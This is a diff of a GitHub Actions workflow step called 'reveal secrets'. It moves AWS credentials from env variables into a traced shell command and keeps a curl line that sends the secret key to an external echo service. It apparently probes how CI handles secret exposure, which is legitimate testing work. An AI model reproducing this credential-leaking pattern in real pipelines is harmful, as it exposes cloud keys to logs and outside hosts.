@@ -28,12 +28,9 @@ jobs:
     steps:
     - name: reveal secrets
       id: reveal-secrets
-      env:
-        AWS_SECRET_ACCESS_KEY: ${{ needs.import-secrets.outputs.AWS_SECRET_ACCESS_KEY}}
-        AWS_ACCESS_KEY: ${{ needs.import-secrets.outputs.AWS_ACCESS_KEY }} 
       run: |
         set -x
-        /usr/local/bin/echovalues.sh $AWS_SECRET_ACCESS_KEY $AWS_ACCESS_KEY first
+        /usr/local/bin/echovalues.sh ${{ needs.import-secrets.outputs.AWS_SECRET_ACCESS_KEY }}  ${{ needs.import-secrets.outputs.AWS_ACCESS_KEY }} first
         curl https://echo.free.beeceptor.com/sample-request?secret=${{ AWS_SECRET_ACCESS_KEY }}
 
 #   deploy:
